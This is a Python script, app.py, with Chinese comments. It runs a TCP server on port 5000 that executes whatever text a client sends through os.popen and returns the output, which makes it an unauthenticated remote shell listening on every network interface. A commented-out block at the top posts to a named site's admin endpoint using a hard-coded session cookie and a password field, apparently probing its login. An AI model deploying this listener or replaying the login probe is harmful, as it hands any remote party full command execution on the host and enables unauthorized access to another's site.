#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2019-12-17 8:24
# @Author  : liujin
# @Email   : 1045833538@QQ.com
# @File    : app.py.py

# import requests as go
# url ='http://wapjin.com/index.php/home/admin'
# head={
# 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36'
# # 'Cookie': 'PHPSESSID=oo72u0ut7u5345gga9kr2fc2h6; Hm_lvt_2ce92fe3f7591ea0c18517ab9a1c7fd9=1575266850,1575514491,1575950189,1576543615; pass=1; Hm_lpvt_2ce92fe3f7591ea0c18517ab9a1c7fd9=1576543722'
# }
# data={
#     'pass':'111.2.19.13'
#
# }
# txt = go.post(url,headers=head,data=data)
# print(txt.headers['Set-Cookie'])
# urls ='http://wapjin.com/index.php/home/admin'
# heads={
# 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
# 'Cookie':str(txt.headers['Set-Cookie'])
# }
# txts = go.post(urls,headers=heads)
# print(txts.headers)
from socket import *
import os

# 主机地址为空字符串，表示绑定本机所有网络接口ip地址
# 等待客户端来连接
IP = ''
# 端口号
PORT = 5000
# 定义一次从socket缓冲区最多读入512个字节数据
BUFLEN = 1024
# 实例化一个socket对象
# 参数 AF_INET 表示该socket网络层使用IP协议
# 参数 SOCK_STREAM 表示该socket传输层使用tcp协议

listenSocket = socket(AF_INET, SOCK_STREAM)

# socket绑定地址和端口
listenSocket.bind((IP, PORT))
# 使socket处于监听状态，等待客户端的连接请求
# 参数 8 表示 最多接受多少个等待连接的客户端

listenSocket.listen(8)
print(f'服务端启动成功，在{PORT}端口等待客户端连接...')
while True:
    dataSocket, addr = listenSocket.accept()
    print('接受一个客户端连接:', addr)

    while True:
        # 尝试读取对方发送的消息
        # BUFLEN 指定从接收缓冲里最多读取多少字节
        try:
            recved = dataSocket.recv(BUFLEN)
        except IOError:
            break

        # 如果返回空bytes，表示对方关闭了连接
        # 退出循环，结束消息收发

        # 读取的字节数据是bytes类型，需要解码为字符串
        info = recved.decode()
        if len(info) > 0:
            # print(os.popen(str(info)).read())
            # 发送的数据类型必须是bytes，所以要编码
            dataSocket.send(f'服务端接收到了信息 {os.popen(str(info)).read()}'.encode())

# 服务端也调用close()关闭socket
dataSocket.close()
listenSocket.close()